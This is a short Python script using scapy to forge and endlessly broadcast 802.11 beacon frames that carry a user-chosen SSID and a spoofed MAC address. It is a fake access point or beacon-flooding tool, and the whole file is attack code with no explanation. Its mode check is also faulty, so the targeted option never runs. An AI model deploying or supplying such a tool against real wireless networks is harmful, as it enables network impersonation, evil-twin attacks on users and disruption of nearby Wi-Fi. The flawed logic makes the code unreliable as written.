from scapy.all import *

iface = input("interface : ")
mode = input("beacon mode, 0(default)=all, 1=targeted")
target_mac = "ff:ff:ff:ff:ff:ff"

if mode != 0 or mode != 1:
    mode = 0
else: 
    target_mac = input("target mac : ")
    while len(target_mac) != 17:
        print("invalid mac error len != 17")
        target_mac = input("target mac : ")

spoofed_mac = input("Spoofed mac : ")
ssid = input("ssid : ")
dot11 = Dot11(type = 0, subtype=8, addr1=target_mac,\
        addr2=spoofed_mac, addr3=spoofed_mac)
beacon = Dot11Beacon()
essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
frame = RadioTap()/dot11/beacon/essid
sendp(frame, inter=0.1, iface=iface, loop=1)
